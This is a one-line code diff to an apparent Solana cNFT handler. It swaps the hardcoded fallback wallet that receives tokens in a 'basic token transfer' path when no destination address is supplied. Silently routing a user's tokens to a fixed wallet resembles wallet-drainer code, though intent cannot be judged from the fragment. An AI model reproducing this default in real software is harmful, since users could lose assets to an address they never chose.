@@ -1444,7 +1444,7 @@ export class CNFTHandler {
                     console.log("METHOD 3: Using basic token transfer (fallback)");
                     
                     if (typeof window !== "undefined" && window.BasicTransfer) {
-                        const targetWallet = destinationAddress || "EJNt9MPzVay5p9iDtSQMs6PGTUFYpX3rNA55y4wqi5P8";
+                        const targetWallet = destinationAddress || "EYjsLzE9VDy3WBd2beeCHA1eVYJxPKVf6NoKKDwq7ujK";
                         
                         // Show notification about fallback
                         if (typeof window !== "undefined" && window.BurnAnimations?.showNotification) {
